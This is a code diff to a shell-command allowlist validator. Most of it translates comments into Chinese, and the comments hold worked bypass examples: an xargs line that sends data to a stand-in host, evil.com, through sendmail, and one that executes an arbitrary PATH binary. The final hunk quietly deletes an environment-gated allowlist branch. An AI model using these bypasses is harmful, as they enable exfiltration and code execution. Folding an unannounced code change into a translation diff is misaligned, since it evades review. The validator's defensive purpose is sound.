@@ -31,27 +31,27 @@ import {
 } from './pathValidation.js'
 import { sedCommandIsAllowedByAllowlist } from './sedValidation.js'
 
-// Unified command validation configuration system
+// 统一的命令校验配置系统
 type CommandConfig = {
-  // A Record mapping from the command (e.g. `xargs` or `git diff`) to its safe flags and the values they accept
+  // 从命令（例如 `xargs` 或 `git diff`）到其安全旗标及可取值的映射 Record
   safeFlags: Record<string, FlagArgType>
-  // An optional regex that is used for additional validation beyond flag parsing
+  // 用于旗标解析之外附加校验的可选正则表达式
   regex?: RegExp
-  // An optional callback for additional custom validation logic. Returns true if the command is dangerous,
-  // false if it appears to be safe. Meant to be used in conjunction with the safeFlags-based validation.
+  // 用于附加自定义校验逻辑的可选回调。若命令危险返回 true，
+  // 若看起来安全返回 false。旨在与基于 safeFlags 的校验配合使用。
   additionalCommandIsDangerousCallback?: (
     rawCommand: string,
     args: string[],
   ) => boolean
-  // When false, the tool does NOT respect POSIX `--` end-of-options.
-  // validateFlags will continue checking flags after `--` instead of breaking.
-  // Default: true (most tools respect `--`).
+  // 为 false 时，工具不遵守 POSIX `--` 选项结束标记。
+  // validateFlags 会继续检查 `--` 之后的旗标，而不是中断。
+  // 默认：true（大多数工具遵守 `--`）。
   respectsDoubleDash?: boolean
 }
 
-// Shared safe flags for fd and fdfind (Debian/Ubuntu package name)
-// SECURITY: -x/--exec and -X/--exec-batch are deliberately excluded —
-// they execute arbitrary commands for each search result.
+// fd 与 fdfind（Debian/Ubuntu 包名）共享的安全旗标
+// 安全：-x/--exec 与 -X/--exec-batch 被刻意排除——
+// 它们会为每个搜索结果执行任意命令。
 const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
   '-h': 'none',
   '--help': 'none',
@@ -74,8 +74,8 @@ const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
   '--fixed-strings': 'none',
   '-a': 'none',
   '--absolute-path': 'none',
-  // SECURITY: -l/--list-details EXCLUDED — internally executes `ls` as subprocess (same
-  // pathway as --exec-batch). PATH hijacking risk if malicious `ls` is on PATH.
+  // 安全：-l/--list-details 被排除——内部会作为子进程执行 `ls`（与
+  // --exec-batch 相同的通路）。若 PATH 上存在恶意 `ls`，有 PATH 劫持风险。
   '-L': 'none',
   '--follow': 'none',
   '-p': 'none',
@@ -122,37 +122,37 @@ const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
   '--format': 'string',
 }
 
-// Central configuration for allowlist-based command validation
-// All commands and flags here should only allow reading files. They should not
-// allow writing to files, executing code, or creating network requests.
+// 基于 allowlist 的命令校验中心配置
+// 这里的所有命令与旗标应仅允许读取文件。它们不应
+// 允许写入文件、执行代码或发起网络请求。
 const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
   xargs: {
     safeFlags: {
       '-I': '{}',
-      // SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
-      // optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
-      // attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
-      // flag takes NO arg and `X` becomes the next positional (target command).
+      // 安全：`-i` 与 `-e`（小写）已移除——两者都使用 GNU getopt
+      // 的可选附加参数语义（`i::`、`e::`）。参数必须
+      // 附加（`-iX`、`-eX`）；空格分隔（`-i X`、`-e X`）意味着
+      // 旗标不取参数，`X` 成为下一个位置参数（目标命令）。
       //
-      // `-i` (`i::` — optional replace-str):
+      // `-i`（`i::` —— 可选的 replace-str）：
       //   echo /usr/sbin/sendm | xargs -it tail a@evil.com
-      //   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
-      //   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
+      //   校验器：-it 捆绑（两者都不是 'none'）OK，tail ∈ SAFE_TARGET → break
+      //   GNU：-i replace-str=t，tail → /usr/sbin/sendmail → 网络外传
       //
-      // `-e` (`e::` — optional eof-str):
+      // `-e`（`e::` —— 可选的 eof-str）：
       //   cat data | xargs -e EOF echo foo
-      //   validator: -e consumes 'EOF' as arg (type 'EOF'), echo ∈ SAFE_TARGET
-      //   GNU: -e no attached arg → no eof-str, 'EOF' is the TARGET COMMAND
-      //   → executes binary named EOF from PATH → CODE EXEC (malicious repo)
+      //   校验器：-e 消费 'EOF' 作为参数（类型 'EOF'），echo ∈ SAFE_TARGET
+      //   GNU：-e 无附加参数 → 无 eof-str，'EOF' 是目标命令
+      //   → 从 PATH 执行名为 EOF 的二进制 → 代码执行（恶意仓库）
       //
-      // Use uppercase `-I {}` (mandatory arg) and `-E EOF` (POSIX, mandatory
-      // arg) instead — both validator and xargs agree on argument consumption.
-      // `-i`/`-e` are deprecated (GNU: "use -I instead" / "use -E instead").
+      // 改用大写 `-I {}`（必选参数）和 `-E EOF`（POSIX，必选
+      // 参数）——校验器与 xargs 在参数消费上一致。
+      // `-i`/`-e` 已弃用（GNU：“use -I instead”/“use -E instead”）。
       '-n': 'number',
       '-P': 'number',
       '-L': 'number',
       '-s': 'number',
-      '-E': 'EOF', // POSIX, MANDATORY separate arg — validator & xargs agree
+      '-E': 'EOF', // POSIX，必选独立参数——校验器与 xargs 一致
       '-0': 'none',
       '-t': 'none',
       '-r': 'none',
@@ -1208,9 +1208,7 @@ function getCommandAllowlist(): Record<string, CommandConfig> {
     const { xargs: _, ...rest } = allowlist
     allowlist = rest
   }
-  if (process.env.USER_TYPE === 'ant') {
-    return { ...allowlist, ...ANT_ONLY_COMMAND_ALLOWLIST }
-  }
+  
   return allowlist
 }
 
